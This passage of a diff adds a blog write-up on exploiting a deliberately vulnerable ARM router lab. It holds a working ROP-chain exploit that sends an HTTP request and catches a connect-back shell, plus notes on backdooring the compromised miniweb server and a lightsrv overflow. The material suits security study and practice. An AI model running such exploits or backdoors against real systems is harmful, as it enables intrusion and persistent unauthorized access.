+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_dummy_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r1_r2_r3_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#75715e"># r1</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#75715e"># r1</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#payload += p32(0xdeadbeef) # r1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#payload += p32(0xffffffff) # r2</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#payload += p32(0xdeadbeef) # r3</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#payload += p32(g_add_r2_1_ea)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#payload += p32(0xdeadbeef) # r4</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#payload += p32(g_mov_r1_0_ea) # also set r0 to 0</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(binsh_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(system_ea) <span style="color:#75715e"># execve(&#34;/bin/sh&#34;, NULL, NULL)</span>
+</span></span><span style="display:flex;"><span>       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> check_null_bytes(payload):
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        req <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;GET /&#39;</span> <span style="color:#f92672">+</span> urlencode(payload)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>        req <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Host: &#39;</span> <span style="color:#f92672">+</span> args<span style="color:#f92672">.</span>host[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>        req <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#req = b&#39;GET /&#39; + payload + b&#39; HTTP/1.1\r\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#req += b&#39;Host: &#39; + args.host[0].encode() + b&#39;\r\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#req += b&#39;\r\n&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;request.txt&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(req)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        l <span style="color:#f92672">=</span> listen(args<span style="color:#f92672">.</span>listen)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        th <span style="color:#f92672">=</span> send_delayed(p, req, <span style="color:#ae81ff">1.0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> l<span style="color:#f92672">.</span>wait_for_connection()
+</span></span><span style="display:flex;"><span>        th<span style="color:#f92672">.</span>join()
+</span></span><span style="display:flex;"><span>        c<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></div><p><img alt="Remote exploit of DVAR" src="/img/dvar/exploit-remote.png"></p>
+<h5 id="backdooring-miniweb">Backdooring miniweb<a href="#backdooring-miniweb" class="hanchor" ariaLabel="Anchor">#</a> </h5>
+<p>Now, we don&rsquo;t want other attackers to exploit the same vuln and enter OUR server (yes it is now).</p>
+<p>What we need to do is:</p>
+<ul>
+<li>remove buffer overflow vuln (so that the server doesn&rsquo;t crash anymore)</li>
+<li>backdoor a relevant function which is being called with our input
+<ul>
+<li>interesting functions:
+<ul>
+<li><code>urldecode</code>: will always be call with the url as argument</li>
+<li><code>gstricmp</code>: will be called if <code>Host</code> field is provided, field value passed as 2nd argument</li>
+<li><code>strstr</code>: will always be called with the url as argument</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="lightsrv">lightsrv<a href="#lightsrv" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<h5 id="reversing">Reversing<a href="#reversing" class="hanchor" ariaLabel="Anchor">#</a> </h5>
+<p>buffer overflow in <code>handle_single_request</code></p>
+<p>crash when <code>Content-Length</code> header is provided and value makes the HTTP request overflows the stack buffer (size 4136) its being copied in.</p>
+<h5 id="exploitation-1">Exploitation<a href="#exploitation-1" class="hanchor" ariaLabel="Anchor">#</a> </h5>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/pwn-linkern-stack/" class="button inline prev">
+        Pwn: Linux Kernel x86 - Basic Buffer Overflow
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/posts/pwn_hackropole-pwnduino/" class="button inline next">
+        PWN: AVR exploitation
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
